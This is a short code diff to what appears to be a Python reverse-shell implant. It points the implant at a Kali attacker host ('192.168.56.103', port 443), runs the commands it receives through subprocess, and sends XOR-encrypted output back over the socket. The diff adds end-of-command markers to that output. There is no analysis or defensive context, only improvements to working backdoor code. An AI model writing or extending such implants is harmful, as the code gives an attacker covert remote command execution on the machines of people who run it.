@@ -5,7 +5,7 @@ import time
 import os
 
 KEY = b'secretkey'
-REVERSE_HOST = "192.168.56.10"  # 🔧 CHANGE to Kali IP
+REVERSE_HOST = "192.168.56.103"  # 🔧 CHANGE to your Kali IP
 REVERSE_PORT = 443
 BUFFER_SIZE = 4096
 
@@ -39,6 +39,9 @@ def connect():
 
                 else:
                     output = subprocess.getoutput(cmd)
+                    if not output.strip():
+                        output = "[NO OUTPUT]"
+                    output += "\n<<END_OF_CMD>>"
                     s.send(xor_encrypt(output.encode()))
         except:
             time.sleep(5)
